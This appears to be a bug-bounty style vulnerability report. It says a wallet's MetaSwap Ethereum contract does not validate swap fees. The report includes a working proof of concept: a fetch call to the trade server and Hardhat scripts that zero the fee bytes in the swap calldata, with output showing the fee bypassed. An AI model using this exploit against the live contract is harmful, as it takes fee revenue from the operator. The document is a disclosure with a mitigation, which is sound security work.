# Risk rating

Critical

# Title

Missing proper access control about the swap fee collected by WalletM.

# Links to affected code

https://etherscan.io/address/0x881d40237659c251811cec9c364ef91dc08d300c#code;

# Vulnerability details

WalletM allows users to exchange their tokens instantly. Through local network capture, we identify one of the relative Ethereum smart contracts (i.e., [MetaSwap](https://etherscan.io/address/0x881d40237659c251811cec9c364ef91dc08d300c#code)). However, there exists a server inconsistency between the access control of the frond-end website and the smart contract, which can be leveraged by every user to bypass the swap fee collected by WalletM.

More specifically, the front-end website inquiries [a self-host server](https://swap.metaswap.codefi.network/networks/1/trades) to obtain possible transactions for a specific token exchange. In each transaction, WalletM collects transaction fees for offering the best exchange price. Such a price is pre-defined by the front-end website and is 0.875% maximum. However, the smart contract (i.e., [MetaSwap](https://etherscan.io/address/0x881d40237659c251811cec9c364ef91dc08d300c#code)) does not check the correctness of the swap fee.

By direct inquiries to the server, users are capable to obtain all possible transactions. Then, by slightly manipulating the transaction, any users can bypass the swap fee collected by WalletM.

## Impact

Any user can bypass the swap fee collection specific by WalletM front-end, which may result in 10k+ loss of WalletM daily.

Although this vulnerability only causes a loss of <1% for each transaction. However, considering the high volume of WalletM's trading transactions, we consider this a critical vulnerability.

## Proof of Concept

Assuming Alice is going to exchange Eth for USDT, using WalletM chrome extension. Here's how Alice attack:
+ Alice inquiries the server hosted by WalletM through the following script, and obtain all possible transactions.
```
const tradeData = await fetch('https://swap.metaswap.codefi.network/networks/1/trades?destinationToken=0x0000000000000000000000000000000000000000&sourceToken=0xdac17f958d2ee523a2206206994597c13d831ec7&sourceAmount=50000000&slippage=2&timeout=10000&walletAddress=0x67be1dd67339d080f9d4ca1976fb0fc69ca6238a')
    .then(response => response.json())
    .then(data => {return data})
```
+ Alice chooses the transaction with the best price.
+ Alice set the 160th byte to the 192nd byte of the input parameter `MetaSwap:swap:bytes calldata data` in the transaction to be zero
+ Alice gets a transaction with zero swap fee.

In the following scripts, we show the normal scenario when a user is using MetaSwap to swap ETH to USDT, with a transaction generated by the WalletM front-end website. Note that, the user should have at least 0.03ETH + Gas Fee.

```
const hre = require("hardhat");
require('dotenv').config();

async function main() {
  const MetaSwapFactory = await hre.ethers.getContractFactory("MetaSwap");
  const MetaSwap = MetaSwapFactory.attach("0x881d40237659c251811cec9c364ef91dc08d300c");
  const USDT = await hre.ethers.getContractAt("ERC20", "0xdAC17F958D2ee523a2206206994597C13D831ec7");

  console.log("MetaSwap deployed on:", await MetaSwap.getAddress());
  console.log("Current block number: ", await hre.ethers.provider.getBlockNumber());
  let attacker = new hre.ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  console.log("attacker's address:      ", attacker.address);  

  console.log("======Before Swap======")
  console.log("attacker's ETH balance:  ", await hre.ethers.provider.getBalance(attacker.address));
  console.log("attacker's USDT balance: ", await USDT.balanceOf(attacker.address));


  let id = "pmmFeeDynamicv4";
  let tokenFrom = "0x0000000000000000000000000000000000000000";
  let amount = "30000000000000000";
  let swapData = "\
0x0000000000000000000000000000000000000000000000000000000000000000\
000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7\
0000000000000000000000000000000000000000000000000069b703ea66a800\
000000000000000000000000000000000000000000000000000000000374c7a1\
0000000000000000000000000000000000000000000000000000000000000120\
\
0000000000000000000000000000000000000000000000000000ddd364dc5800\
\
000000000000000000000000f326e4de8f66a0bdc0970b79e0924e33c79f1915\
0000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000001e0\
000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7\
000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\
000000000000000000000000000000000000000000000000000000000386d627\
0000000000000000000000000000000000000000000000000069b703ea66a800\
000000000000000000000000a69babef1ca67a37ffaf7a485dfff3382056e78c\
00000000000000000000000074de5d4fcbf63e00296fd95d33236b9794016631\
00000000000000000000000067be1dd67339d080f9d4ca1976fb0fc69ca6238a\
0000000000000000000000000000000000000000000000000000000000000000\
0000000000000000000000000000000000000000000000000000000064b12bc5\
01ffffffffffffffffffffffffffffffffffffff0ef5cf1364b12b2f00000033\
0000000000000000000000000000000000000000000000000000000000000003\
000000000000000000000000000000000000000000000000000000000000001c\
13469a2bda28e2628f4b25e047abcc27c28b3de9cca92aa79a87e381c7fa2847\
7d4a49b760817460a04baebc3066e5ec579eff7dabf72bb3bbb3e5e434bd80e5\
0000000000000000000000000000000000000000000000000069b703ea66a800";
  
  await MetaSwap.connect(attacker).swap(id, tokenFrom, amount, swapData, {value: "30000000000000000"});

  console.log("=======After Swap======")
  console.log("attacker's ETH balance:  ", await hre.ethers.provider.getBalance(attacker.address));
  console.log("attacker's USDT balance: ", await USDT.balanceOf(attacker.address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

And we get the following result:

```
MetaSwap deployed on: 0x881d40237659c251811cec9c364ef91dc08d300c
Current block number:  17691275
attacker's address:       0x67be1Dd67339D080f9D4CA1976fB0fc69Ca6238A
======Before Swap======
attacker's ETH balance:   64647206303712239n
attacker's USDT balance:  0n
=======After Swap======
attacker's ETH balance:   30850855827390127n
attacker's USDT balance:  59168295n
```

However, in the following script, the attacker manipulates the swap fee to zero by letting the 160th byte to the 192nd byte be zero.

```
const hre = require("hardhat");
require('dotenv').config();

async function main() {
  const MetaSwapFactory = await hre.ethers.getContractFactory("MetaSwap");
  const MetaSwap = MetaSwapFactory.attach("0x881d40237659c251811cec9c364ef91dc08d300c");
  const USDT = await hre.ethers.getContractAt("ERC20", "0xdAC17F958D2ee523a2206206994597C13D831ec7");

  console.log("MetaSwap deployed on:", await MetaSwap.getAddress());
  console.log("Current block number: ", await hre.ethers.provider.getBlockNumber());
  let attacker = new hre.ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  console.log("attacker's address:      ", attacker.address);  

  console.log("======Before Swap======")
  console.log("attacker's ETH balance:  ", await hre.ethers.provider.getBalance(attacker.address));
  console.log("attacker's USDT balance: ", await USDT.balanceOf(attacker.address));


  let id = "pmmFeeDynamicv4";
  let tokenFrom = "0x0000000000000000000000000000000000000000";
  let amount = "30000000000000000";
  let swapData = "\
0x0000000000000000000000000000000000000000000000000000000000000000\
000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7\
0000000000000000000000000000000000000000000000000069b703ea66a800\
000000000000000000000000000000000000000000000000000000000374c7a1\
0000000000000000000000000000000000000000000000000000000000000120\
\
0000000000000000000000000000000000000000000000000000000000000000\
\
000000000000000000000000f326e4de8f66a0bdc0970b79e0924e33c79f1915\
0000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000001e0\
000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7\
000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\
000000000000000000000000000000000000000000000000000000000386d627\
0000000000000000000000000000000000000000000000000069b703ea66a800\
000000000000000000000000a69babef1ca67a37ffaf7a485dfff3382056e78c\
00000000000000000000000074de5d4fcbf63e00296fd95d33236b9794016631\
00000000000000000000000067be1dd67339d080f9d4ca1976fb0fc69ca6238a\
0000000000000000000000000000000000000000000000000000000000000000\
0000000000000000000000000000000000000000000000000000000064b12bc5\
01ffffffffffffffffffffffffffffffffffffff0ef5cf1364b12b2f00000033\
0000000000000000000000000000000000000000000000000000000000000003\
000000000000000000000000000000000000000000000000000000000000001c\
13469a2bda28e2628f4b25e047abcc27c28b3de9cca92aa79a87e381c7fa2847\
7d4a49b760817460a04baebc3066e5ec579eff7dabf72bb3bbb3e5e434bd80e5\
0000000000000000000000000000000000000000000000000069b703ea66a800";
  
  await MetaSwap.connect(attacker).swap(id, tokenFrom, amount, swapData, {value: "30000000000000000"});

  console.log("=======After Swap======")
  console.log("attacker's ETH balance:  ", await hre.ethers.provider.getBalance(attacker.address));
  console.log("attacker's USDT balance: ", await USDT.balanceOf(attacker.address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

The following result shows that we successfully attack (i.e., getting the same amount of USDT with less ETH by bypassing fee collection):

```
MetaSwap deployed on: 0x881d40237659c251811cec9c364ef91dc08d300c
Current block number:  17691275
attacker's address:       0x67be1Dd67339D080f9D4CA1976fB0fc69Ca6238A
======Before Swap======
attacker's ETH balance:   64647206303712239n
attacker's USDT balance:  0n
=======After Swap======
attacker's ETH balance:   31248154009945663n
attacker's USDT balance:  59168295n
```

## Recommended Mitigation Steps

+ Adding an additional access control.